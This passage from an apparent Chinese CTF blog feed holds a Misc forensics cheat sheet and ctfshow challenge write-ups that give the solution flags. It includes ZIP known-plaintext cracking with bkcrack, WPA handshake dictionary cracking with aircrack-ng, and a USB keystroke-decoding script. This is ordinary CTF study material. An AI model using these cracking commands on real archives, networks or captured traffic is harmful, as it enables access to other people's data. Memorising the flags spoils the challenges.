href=\"#zsteg-能自动列举出所有情况的最低有效位\" class=\"headerlink\" title=\"zsteg (能自动列举出所有情况的最低有效位)\"></a>zsteg (能自动列举出所有情况的最低有效位)</h3><h3 id=\"wbstego4-解密通过-lsb-加密的图片\"><a href=\"#wbstego4-解密通过-lsb-加密的图片\" class=\"headerlink\" title=\"wbstego4 (解密通过 lsb 加密的图片)\"></a>wbstego4 (解密通过 lsb 加密的图片)</h3><h3 id=\"python-脚本\"><a href=\"#python-脚本\" class=\"headerlink\" title=\"python 脚本\"></a>python 脚本</h3><h3 id=\"TweakPNG\"><a href=\"#TweakPNG\" class=\"headerlink\" title=\"TweakPNG\"></a>TweakPNG</h3><p>使用场景：文件头正常却无法打开文件，利用TweakPN修改CRC</p>\n<ul>\n<li><p>CRC出错，根据提示在源文件搜索替换即可</p>\n</li>\n<li><p>CRC没错，但由于高度或宽度错误，需通过CRC计算出正确的高度或宽度，之后修改高度或宽度</p>\n</li>\n</ul>\n<h3 id=\"Bftools\"><a href=\"#Bftools\" class=\"headerlink\" title=\"Bftools\"></a>Bftools</h3><p>用于解密图片信息</p>\n<pre><code class=\"bash\">Bftools.exe decode braincopter filename --output out_file\nBftools.exe run out_file\n</code></pre>\n<h3 id=\"slienteye\"><a href=\"#slienteye\" class=\"headerlink\" title=\"slienteye\"></a>slienteye</h3><h2 id=\"JPG-图像相关\"><a href=\"#JPG-图像相关\" class=\"headerlink\" title=\"JPG 图像相关\"></a>JPG 图像相关</h2><ul>\n<li><p>Stegdetect 工具探测加密方式</p>\n</li>\n<li><p>主要有<code>JSteg</code>、<code>JPHide</code> 、<code>OutGuess</code>、<code>Invisible Secrets</code>、<code>F5</code>、<code>appendX</code>、<code>Camouflage</code></p>\n</li>\n<li><p>Jhide图形化工具</p>\n</li>\n<li><p>outguess</p>\n<p><code>outguess -r file out_file</code></p>\n</li>\n<li><p>F5 F5-steganography_F5</p>\n<p><code>Java Extract file -p password</code></p>\n</li>\n</ul>\n<h2 id=\"对于黑变白，或变彩色的二维码图片\"><a href=\"#对于黑变白，或变彩色的二维码图片\" class=\"headerlink\" title=\"对于黑变白，或变彩色的二维码图片\"></a>对于黑变白，或变彩色的二维码图片</h2><ul>\n<li><p>画图软件，选择后 <code>反色</code></p>\n</li>\n<li><p>Stegsolve选择各种通道查看图片 (或许需要先反色)</p>\n</li>\n</ul>\n<h2 id=\"压缩文件操作\"><a href=\"#压缩文件操作\" class=\"headerlink\" title=\"压缩文件操作\"></a>压缩文件操作</h2><h3 id=\"伪加密\"><a href=\"#伪加密\" class=\"headerlink\" title=\"伪加密\"></a>伪加密</h3><ul>\n<li>对于zip搜索<code>504b0102</code>，再从<code>50</code>开始，数到第九个和第十个，将其改为<code>0000</code></li>\n<li>对于rar，从头往后，第<code>24</code>个字节，尾数为<code>4</code>为加密，尾数为<code>0</code>为无加密</li>\n</ul>\n<pre><code class=\"raw\">ZIP 文件主要由三个部分组成：压缩源文件数据区 + 核心目录 + 目录结束标志\n\n压缩源文件数据区\nlocal file header + file data + data descriptor\n\nlocal file header：文件头用于标识该文件的开始，记录了该压缩文件的信息，\n这里的文件头标识由固定值 50 4B 03 04 开头，也是 ZIP 的文件头的重要标志。\n\nfile data：文件数据记录了相应压缩文件的数据。\n\ndata descriptor：数据描述符用于标识该文件压缩结束，\n该结构只有在相应的 local file header 中通用标记字段的第 3 bit 设为 1 时才会出现，\n紧接在压缩文件源数据后。\n50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32 校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n00 00：扩展记录长度 \n\n6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 （直到核心目录文件头标识）\n\n\n压缩源文件目录区\n记录了压缩文件的目录信息，在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据。\n\n50 4B 01 02：目录中文件文件头标记 (0x02014b50)  \n3F 00：压缩使用的 pkware 版本  \n14 00：解压文件所需 pkware 版本  \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为 09 00 打开就会提示有密码了）  \n08 00：压缩方式  \n5A 7E：最后修改文件时间  \nF7 46：最后修改文件日期 \n\n16 B5 80 14：CRC-32 校验（1480B516）  \n19 00 00 00：压缩后尺寸（25）  \n17 00 00 00：未压缩尺寸（23）  \n07 00：文件名长度  \n24 00：扩展字段长度  \n00 00：文件注释长度  \n00 00：磁盘开始号  \n00 00：内部文件属性  \n20 00 00 00：外部文件属性  \n00 00 00 00：局部头部偏移量  \n6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 (直到目录结束标识头）\n\n目录结束标识（End of Central Directory Record)\n存在于整个归档包的结尾，用于标记压缩的目录数据的结束。每个压缩文件必须有且只有一个结束标识。\n\n50 4B 05 06：目录结束标记  \n00 00：当前磁盘编号  \n00 00：目录区开始磁盘编号  \n01 00：本磁盘上纪录总数  \n01 00：目录区中纪录总数  \n59 00 00 00：目录区尺寸大小  \n3E 00 00 00：目录区对第一张磁盘的偏移量  \n00 00：ZIP 文件注释长度\n————————————————\n版权声明：本文为 CSDN 博主「Hardworking666」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/Hardworking666/article/details/122266479\n</code></pre>\n<h3 id=\"暴力破解\"><a href=\"#暴力破解\" class=\"headerlink\" title=\"暴力破解\"></a>暴力破解</h3><p>ARCHPR 工具</p>\n<p>Zip</p>\n<h3 id=\"明文攻击\"><a href=\"#明文攻击\" class=\"headerlink\" title=\"明文攻击\"></a>明文攻击</h3><ul>\n<li><p>拥有压缩文件中其中一个或多个相同的文件时，可以将其用与压缩包相同的算法压缩，然后放入ARCHPR中破解，得到密钥后，然后使用密钥破解</p>\n</li>\n<li><p>bkcrack工具</p>\n<p>知道某一文件的其中部分内容时，可以使用bkcrack, 如知道解压文件中<code>flag.txt</code>的<code>xxxx</code>内容</p>\n<pre><code class=\"bash\">echo -n 'xxxx'(已知的明文内容) &gt; plain.txt \nbkcrack -C flag.zip(目标压缩文件) -c flag.txt(目标文件) -p plain.txt(已知道的部分明文存储文件) -x 33 30394632 # 33 为 09F2 的十六进制在 flag 中的偏移量\n</code></pre>\n<p>得到密钥后</p>\n<pre><code class=\"bash\">bkcrack -C flag.zip -c flag.txt -k xxxxxxxx xxxxxxxx xxxxxxxx(上面操作得到的密钥) -d flag.txt\n</code></pre>\n<p>获得一个没有密码的压缩包，正常解压</p>\n</li>\n</ul>\n<h3 id=\"RAR-文件格式相关-本地试没有成功\"><a href=\"#RAR-文件格式相关-本地试没有成功\" class=\"headerlink\" title=\"RAR 文件格式相关 (本地试没有成功)\"></a>RAR 文件格式相关 (本地试没有成功)</h3><pre><code class=\"raw\">HEAD_CRC\t\t2 字节\t\t\t\t\t所有块或块部分的 CRC\nHEAD_TYPE\t\t1 字节\t\t\t\t\t块类型\nHEAD_FLAGS\t\t2 字节\t\t\t\t\t块标记\nHEAD_SIZE\t\t2 字节\t\t\t\t\t块大小\nADD_SIZE\t\t4 字节\t\t\t\t\t可选结构，增加块大小\n-----------------------------------------------\n那么，文件块的第 3 个字节为块类型，也叫头类型\n头类型是 0x72 表示是标记块\n头类型是 0x73 表示是压缩文件头块\n头类型是 0x74 表示是文件头块\n头类型是 0x75 表示是注释头块\n</code></pre>\n<p># 本文作者： dpm12345 @dpm12345<br># 本文链接： <a href=\"http://dpm12345.cn/2022/10/02/Misc/\">http://dpm12345.cn/2022/10/02/Misc/</a><br># 版权声明： 本站所有文章除特别声明外，均采用 (CC)BY-NC-SA 许可协议。转载请注明出处！</p>\n<p><strong>确定文件块的位置：</strong> 查看右边字符，根据内容来确认一个文件的开始与结束</p>\n<h1 id=\"流量取证\"><a href=\"#流量取证\" class=\"headerlink\" title=\"流量取证\"></a>流量取证</h1><h2 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h2><h3 id=\"过滤命令\"><a href=\"#过滤命令\" class=\"headerlink\" title=\"过滤命令\"></a>过滤命令</h3><ul>\n<li><p>ip</p>\n<ul>\n<li><p>ip.src eq / == x.x.x.x 对源地址的过滤</p>\n</li>\n<li><p>ip.dst eq / == x.x.x.x 对目标地址的过滤</p>\n</li>\n<li><p>ip.addr eq / == x.x.x.x 对源或目标的过滤</p>\n</li>\n</ul>\n</li>\n<li><p>port</p>\n<ul>\n<li><p>tcp.port eq 80 or udp.port eq 80</p>\n</li>\n<li><p>tcp.dstport == 80 只显示 tcp 协议的目标端口 80</p>\n</li>\n<li><p>tcp.srcport == 80 只显示 tcp 协议的源端口为 80</p>\n</li>\n<li><p>tcp.port &gt;=1 and tcp.port &lt;= 80 显示一段范围内 tcp 协议的端口</p>\n</li>\n</ul>\n</li>\n<li><p>过滤协议</p>\n<ul>\n<li>tcp/udp/http…</li>\n</ul>\n</li>\n<li><p>过滤 MAC</p>\n<ul>\n<li>eth.dst == A0:00:00:04:C5:84 过滤目标 MAC</li>\n</ul>\n</li>\n<li><p>包长度过滤</p>\n<ul>\n<li><p>udp.lenth == 26 指 udp 本身固定长度 8 加上 udp 下面那块数据包之和</p>\n</li>\n<li><p>tcp.len &gt;= 7 指的是 ip 数据包 ( tcp 下面那块数据), 不包括 tcp 本身</p>\n</li>\n<li><p>ip.len == 94 除了以太网头固定长度 14 ，其他都是 ip.len ，及从 ip 本身到最后</p>\n</li>\n<li><p>frame.len == xxx 整个数据包长度，从 eth 开始到最后</p>\n</li>\n</ul>\n</li>\n<li><p>http 模式过滤</p>\n<ul>\n<li><p>http.request.method == “GET”</p>\n</li>\n<li><p>http.request.method == “POST”</p>\n</li>\n<li><p>http.request.url == “/img/logo-edu.gif”</p>\n</li>\n<li><p>http contains “GET”</p>\n</li>\n<li><p>http contains “HTTP/1.”</p>\n</li>\n<li><p>http contains “flag”</p>\n</li>\n<li><p>http contains “KEY”</p>\n</li>\n<li><p>tcp contains “flag”</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"协议分级\"><a href=\"#协议分级\" class=\"headerlink\" title=\"协议分级\"></a>协议分级</h3><p>工具栏中的<code>统计--&gt;协议分级</code>，可以用来查看大致的协议分别情况</p>\n<h3 id=\"筛选特征\"><a href=\"#筛选特征\" class=\"headerlink\" title=\"筛选特征\"></a>筛选特征</h3><p>右键 –&gt; 作为过滤器应用 –&gt; 选中</p>\n<h3 id=\"流汇聚\"><a href=\"#流汇聚\" class=\"headerlink\" title=\"流汇聚\"></a>流汇聚</h3><p>右键 –&gt; 追踪流</p>\n<h3 id=\"数据提取\"><a href=\"#数据提取\" class=\"headerlink\" title=\"数据提取\"></a>数据提取</h3><h3 id=\"自动提取通过-http-传输的文件内容\"><a href=\"#自动提取通过-http-传输的文件内容\" class=\"headerlink\" title=\"自动提取通过 http 传输的文件内容\"></a>自动提取通过 http 传输的文件内容</h3><p><code>文件--&gt;导出对象--&gt;HTTP</code></p>\n<h3 id=\"手动提取文件内容-信息\"><a href=\"#手动提取文件内容-信息\" class=\"headerlink\" title=\"手动提取文件内容 (信息)\"></a>手动提取文件内容 (信息)</h3><p>右键 –&gt; 导出分组字节流 –&gt; 或者 点击菜单栏 文件 –&gt; 导出分组字节流，</p>\n<p>快捷方式 <code>Ctrl+H</code> ，在弹出的框中将文件保存成二进制文件</p>\n<h3 id=\"无线wifi流量包跑密码\"><a href=\"#无线wifi流量包跑密码\" class=\"headerlink\" title=\"无线wifi流量包跑密码\"></a>无线wifi流量包跑密码</h3><p>协议分析：wireless LAN 协议，很有可能是WPA或者WEP加密的无线数据包</p>\n<h4 id=\"aircrack-ng\"><a href=\"#aircrack-ng\" class=\"headerlink\" title=\"aircrack-ng\"></a>aircrack-ng</h4><ul>\n<li><p>用aircrack-ng检查cap包<code>aircrack-ng xxx.cap</code></p>\n</li>\n<li><p>用aircrack-ng跑字典进行握手包破解<code>aircrack-ng xxx.cap -w pass.txt</code></p>\n</li>\n</ul>\n<h3 id=\"USB-流量包分析\"><a href=\"#USB-流量包分析\" class=\"headerlink\" title=\"USB 流量包分析\"></a>USB 流量包分析</h3><p>USB 主要涉及键盘击键、鼠标移动与点击，存储设备的明文传输通信。USB 无线网卡网络传输内容等</p>\n<p>USB 协议的数据部分在 Leftover Capture Data 域之中</p>\n<p>右键 –&gt;leftover capture data –&gt; 应用为列</p>\n<p>Leftover capture data 有着信息数据</p>\n<h4 id=\"键盘流量\"><a href=\"#键盘流量\" class=\"headerlink\" title=\"键盘流量\"></a>键盘流量</h4><h4 id=\"鼠标流量\"><a href=\"#鼠标流量\" class=\"headerlink\" title=\"鼠标流量\"></a>鼠标流量</h4><p>鼠标数据包的数据长度是4个字节</p>\n<p>第一个字节代表按键，当取<code>0x00</code>时，代表没有按键；当<code>0x01</code>时，代表按左键，为<code>0x02</code>时，代表按右键</p>\n<p>第二个字节代表左右偏移，值为正，代表右移多少像素，为负，则向左移多少像素</p>\n<p>第三个字节代表上下偏移，上为正，下位负</p>\n<p><strong>提取：</strong></p>\n<ul>\n<li><p>文件 -&gt; 导出分组解析结果 -&gt; 为csv，导出保存成一个.csv文件</p>\n</li>\n<li><p>wireshark提供的命令行工具<code>tshark</code>，可以将<code>Leftover Capture Data</code>数据单独复制出来</p>\n<p><code>tshark -r usb1.pcap(流量文件) -T fields -e usb.capdata &gt; usbdata.txt</code></p>\n</li>\n</ul>\n<p>对于键盘数据，可以通过脚本进行转换，转换成对应的字母</p>\n<p>对于鼠标数据，则根据数据用脚本描出轨迹，画图，得到信息</p>\n<p>这里有两个脚本</p>\n<p>键盘数据：(修改了 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvVXNiS2V5Ym9hcmREYXRhSGFja2Vy\">https://github.com/WangYihang/UsbKeyboardDataHacker</span> 部分代码)</p>\n<pre><code class=\"python\">#!/usr/bin/env python\n\nimport sys\nimport os\n\nDataFileName = \"usb.dat\"\n\npresses = []\n\nnormalKeys = {\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\nshiftKeys = {\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\":\",\"34\":\"\\\"\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\ndef main():\n    # check argv\n    if len(sys.argv) != 2:\n        print(\"Usage : \")\n        print(\"        python UsbKeyboardHacker.py data.pcap\")\n        print(\"Tips : \")\n        print(\"        To use this python script , you must install the tshark first.\")\n        print(\"        You can use `sudo apt-get install tshark` to install it\")\n        print(\"Author : \")\n        print(\"        WangYihang &lt;wangyihanger@gmail.com&gt;\")\n        print(\"        If you have any questions , please contact me by email.\")\n        print(\"        Thank you for using.\")\n        exit(1)\n\n    # get argv\n    pcapFilePath = sys.argv[1]\n    \n    # get data of pcap\n    os.system(\"tshark -r %s -T fields -e usb.capdata  &gt; %s\" % (pcapFilePath, DataFileName))\n\n    # read data\n    with open(DataFileName, \"r\") as f:\n        for line in f:\n            presses.append(line[0:-1])\n    # handle\n    result = \"\"\n    for press in presses:\n        if press == '':\n            continue\n        if ':' in press:\n            Bytes = press.split(\":\")\n        else:\n            Bytes = [press[i:i+2] for i in range(0, len(press), 2)]\n        if Bytes[0] == \"00\":\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += normalKeys[Bytes[2]]\n        elif int(Bytes[0],16) &amp; 0b10 or int(Bytes[0],16) &amp; 0b100000: # shift key is pressed.\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += shiftKeys[Bytes[2]]\n        else:\n            print(\"[-] Unknow Key : %s\" % (Bytes[0]))\n    print(\"[+] Found : %s\" % (result))\n\n    # clean the temp data\n    os.remove(DataFileName)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>鼠标数据：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RwbTEyMzQ1L1VzYk1pY2VEYXRhSGFja2Vy\">https://github.com/dpm12345/UsbMiceDataHacker</span></p>\n<p>(修改自 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvVXNiTWljZURhdGFIYWNrZXI=\">https://github.com/WangYihang/UsbMiceDataHacker</span>)</p>\n<h3 id=\"HTTPS-流量包分析\"><a href=\"#HTTPS-流量包分析\" class=\"headerlink\" title=\"HTTPS 流量包分析\"></a>HTTPS 流量包分析</h3><p>https流量是经过TLS协议加密过的，需要导入key才能看到原始的http流量</p>\n<p>编辑 -&gt; 首选项 -&gt; Protocols -&gt; SSL -&gt; Edit RSA keys list</p>\n",
            "tags": [
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e58b935e/",
            "url": "http://dpm12345.cn/posts/e58b935e/",
            "title": "Misc入门",
            "date_published": "2022-10-10T15:12:29.000Z",
            "content_html": "<h1 id=\"图片篇-基础操作\"><a href=\"#图片篇-基础操作\" class=\"headerlink\" title=\"图片篇 (基础操作)\"></a>图片篇 (基础操作)</h1><h2 id=\"misc1\"><a href=\"#misc1\" class=\"headerlink\" title=\"misc1\"></a>misc1</h2><p>图片就是</p>\n<h2 id=\"misc2\"><a href=\"#misc2\" class=\"headerlink\" title=\"misc2\"></a>misc2</h2><p>直接打开，发现png头，改<code>.png</code>，打开得到flag</p>\n<h2 id=\"misc3\"><a href=\"#misc3\" class=\"headerlink\" title=\"misc3\"></a>misc3</h2><p>010 打开，bpg头 </p>\n<p>bpgviewer安装打开得到 flag</p>\n<h2 id=\"misc4\"><a href=\"#misc4\" class=\"headerlink\" title=\"misc4\"></a>misc4</h2><p>一开始以为是文件合并，之后发现是txt均为图片，修改后缀打开获得flag</p>\n<h1 id=\"图片篇-信息附加\"><a href=\"#图片篇-信息附加\" class=\"headerlink\" title=\"图片篇 (信息附加)\"></a>图片篇 (信息附加)</h1><h2 id=\"misc5\"><a href=\"#misc5\" class=\"headerlink\" title=\"misc5\"></a>misc5</h2><p>图片显示没有flag，用010打开，拉到最后，可以看到flag</p>\n<h2 id=\"misc6\"><a href=\"#misc6\" class=\"headerlink\" title=\"misc6\"></a>misc6</h2><p>同上一题，但flag在中间</p>\n<h2 id=\"misc7\"><a href=\"#misc7\" class=\"headerlink\" title=\"misc7\"></a>misc7</h2><p>同上题，直接搜</p>\n<h2 id=\"misc8\"><a href=\"#misc8\" class=\"headerlink\" title=\"misc8\"></a>misc8</h2><p>binwalk能分析出来png，但同样也弄出来zlib，这里不准确</p>\n<ol>\n<li><p>使用foremost分离<code>foremost misc8.png -o ./misc8</code></p>\n</li>\n<li><p>手动分离，能找到第二张图片位置为<code>0xf34</code>，手动复制或用<code>dd</code>命令</p>\n</li>\n</ol>\n<h2 id=\"misc9\"><a href=\"#misc9\" class=\"headerlink\" title=\"misc9\"></a>misc9</h2><p>解压后010打开图片，能直接找到flag</p>\n<h2 id=\"misc10\"><a href=\"#misc10\" class=\"headerlink\" title=\"misc10\"></a>misc10</h2><p>binwalk分离，第一个打开就是flag</p>\n<h2 id=\"misc11\"><a href=\"#misc11\" class=\"headerlink\" title=\"misc11\"></a>misc11</h2><p>对于png图片，其关键数据块由</p>\n<ol>\n<li>文件头数据块IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。</li>\n<li>调色板数据块PLTE（palette chunk）：必须放在图像数据块之前。</li>\n<li>图像数据块IDAT（image data chunk）：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。</li>\n<li>图像结束数据IEND（image trailer chunk）：放在文件尾部，表示PNG数据流结束。</li>\n</ol>\n<p>这四个组成</p>\n<p>根据提示在另一张图片里，通过010，可以看到有两个IDAT删去第一个，可以看到图片变化 ，出现flag</p>\n<p>(或者使用tweakpng进行同样操作)</p>\n<h2 id=\"misc12\"><a href=\"#misc12\" class=\"headerlink\" title=\"misc12\"></a>misc12</h2><p>同上题，删去IDAT只不过要删去8个 </p>\n<p>自己写了个批量删除脚本</p>\n<pre><code class=\"python\">import os\n\nfile = input(\"图片路径:\")\nout_folder = \"png_IDAT_out\"\nos.mkdir(out_folder) if not os.path.exists(out_folder) else None\n\nf = open(file,\"rb\")\n\ncontent = f.read()\n\nfilename = \"{}.png\"\n\nindex = content.index(b\"IDAT\")\nIHDR_end = index - 4\nnum = 0\n\nwhile b\"IDAT\" in content[index+4:]:\n    index = content[index+4:].index(b\"IDAT\") + index +4\n    data = content[0:IHDR_end] + content[index - 4:]\n    num +=1\n    print(\"正在生成第{}张图片\".format(num))\n    with open(out_folder + \"/\" + filename.format(num),\"wb\") as f1:\n        f1.write(data)\n\nprint(\"共生成{}张图片\".format(num))\nprint(\"请在该脚本路径下的 {} 文件夹查看\".format(out_folder))\n</code></pre>\n<h2 id=\"misc13\"><a href=\"#misc13\" class=\"headerlink\" title=\"misc13\"></a>misc13</h2><p>010打开，可以看到四段类flag的字符串，字符之间隔了一个字符</p>\n<pre><code class=\"raw\">c\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT34fxa%4Ý8ïf«5\u00102•8\u001fb‚1º7E4|2Td~7:2äeñ6úfõ4\u001e1\u00072\u001d9T8ñ328é0l}\nc\u001at¹f…s†hªoKw°{!1\u0014eS3¥eT24exd%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2T6~7:däeñ1úcõ4\u001e1\u00072\u001daT8ñ329éal}\nc\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT34exa%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2Td~7:däeñ6úfõ4\u001e1\u00072\u001dfT8ñ329éal}\nc\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT446xc%4Ý8ïf«7\u00103•9\u001fb‚7ºeEb|2Td~1:däeñ6úeõ4\u001e1\u00072\u001dfT8ñ329éal}\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">ctfshow{ae6e3fa48f528b1742d72e6f41298380}\nctfshow{1e3e2ed48f518b7e4267de1c412a839a}\nctfshow{ae6e3ea48f518b7e42d7de6f412f839a}\nctfshow{ae6e46c48f739b7eb2d1de6e412f839a}\n</code></pre>\n<p>一个一个试，得到第三个正确</p>\n<h2 id=\"misc14\"><a href=\"#misc14\" class=\"headerlink\" title=\"misc14\"></a>misc14</h2><p>根据binwalk的分析，手动分离，在最后一个jpg找到flag</p>\n<p><code>ctfshow{ce520f767fc465b0787cdb936363e694}</code></p>\n<h2 id=\"misc15\"><a href=\"#misc15\" class=\"headerlink\" title=\"misc15\"></a>misc15</h2><p>010打开，可以看到flag</p>\n<p><code>ctfshow{fbe7bb657397e6e0a6adea3e40265425}</code></p>\n<h2 id=\"misc16\"><a href=\"#misc16\" class=\"headerlink\" title=\"misc16\"></a>misc16</h2><p>binwalk分离，在DD4文件中<code>ctfshow{a7e32f131c011290a62476ae77190b52}</code></p>\n<h2 id=\"misc17\"><a href=\"#misc17\" class=\"headerlink\" title=\"misc17\"></a>misc17</h2><p>首先使用 zsteg</p>\n<p>显示extradata:0</p>\n<pre><code class=\"raw\">[?] 3544 bytes of extra data after zlib stream\nextradata:0         .. \n    00000000: e1 1f 30 53 86 4f c5 a4  1b f5 e6 e5 c7 46 0a 92  |..0S.O.......F..|\n    00000010: 9b ee 72 e7 c9 9e b9 a7  74 de 92 4d ad 61 5b 58  |..r.....t..M.a[X|\n    00000020: f2 98 65 77 2b d2 d3 85  32 fc 08 83 86 1f 0f 1e  |..ew+...2.......|\n    00000030: cb ab ac 9c 4b ca 02 20  e2 ce e4 ae 60 1a 2c c6  |....K.. ....`.,.|\n    00000040: 7b c8 9a 77 31 2f 9e 67  db d9 3e 53 fe 17 a5 50  |{..w1/.g..&gt;S...P|\n    00000050: 20 e5 1d 8c d5 49 4e 52  a5 54 31 cb 8b c5 3b 09  | ....INR.T1...;.|\n    00000060: a2 a6 fe 5b da 4f 9e 78  9c 5d 46 d6 e2 6b 6b 2a  |...[.O.x.]F..kk*|\n    00000070: f2 62 0c ba 70 19 a0 27  f3 84 77 99 02 77 05 79  |.b..p..'..w..w.y|\n    00000080: 5b 44 b7 79 b3 54 11 a1  f3 54 34 56 7e ff 55 d1  |[D.y.T...T4V~.U.|\n    00000090: c6 39 90 c8 21 7f 26 39  44 58 78 c3 ed 37 4a 7c  |.9..!.&amp;9DXx..7J||\n    000000a0: 50 24 e8 79 7b 4b 9c fa  2a 2c bb e8 b9 fb 40 2c  |P$.y{K..*,....@,|\n    000000b0: 50 05 21 4c 3b 29 65 b4  60 1c 27 bb 4c 16 bf f1  |P.!L;)e.`.'.L...|\n    000000c0: 77 c0 55 04 5e 25 0e 18  1e 58 ab 0f 13 11 f2 3f  |w.U.^%...X.....?|\n    000000d0: cf a0 32 b1 f5 a8 1b 99  a7 4b 46 89 cf 85 89 50  |..2......KF....P|\n    000000e0: 88 20 8f 4f fd e2 97 55  68 73 b4 96 ba dd 25 a3  |. .O...Uhs....%.|\n    000000f0: 83 72 3f 99 77 9e 0a 08  50 4f 11 8f 87 65 c0 29  |.r?.w...PO...e.)|\n</code></pre>\n<p>显示有隐藏的额外信息</p>\n<p>再<code>zsteg -e extradata:0 misc17.png &gt; 1.txt</code></p>\n<p>然后binwalk，得到图片文件<code>binwalk -e 1.txt</code></p>\n<h2 id=\"misc18\"><a href=\"#misc18\" class=\"headerlink\" title=\"misc18\"></a>misc18</h2><p>文件的属性中</p>\n<h2 id=\"misc19\"><a href=\"#misc19\" class=\"headerlink\" title=\"misc19\"></a>misc19</h2><p>010找到flag，<code>ctfshow{dfdcf08038cd446a5eb50782f8d3605d}</code></p>\n<p>或者exiftool，在<code>Document Name</code>和<code>Host Computer</code>中</p>\n<pre><code class=\"raw\">Document Name                   : ctfshow{dfdcf08038cd446a5\nStrip Offsets                   : 21688 25422\nOrientation                     : Horizontal (normal)\nSamples Per Pixel               : 3\nRows Per Strip                  : 97\nStrip Byte Counts               : 3733 749\nX Resolution                    : 72\nY Resolution                    : 72\nPlanar Configuration            : Chunky\nResolution Unit                 : inches\nSoftware                        : Adobe Photoshop CC 2019 (Windows)\nModify Date                     : 2021:03:25 10:35:18\nHost Computer                   : eb50782f8d3605d}\n</code></pre>\n<h2 id=\"misc20\"><a href=\"#misc20\" class=\"headerlink\" 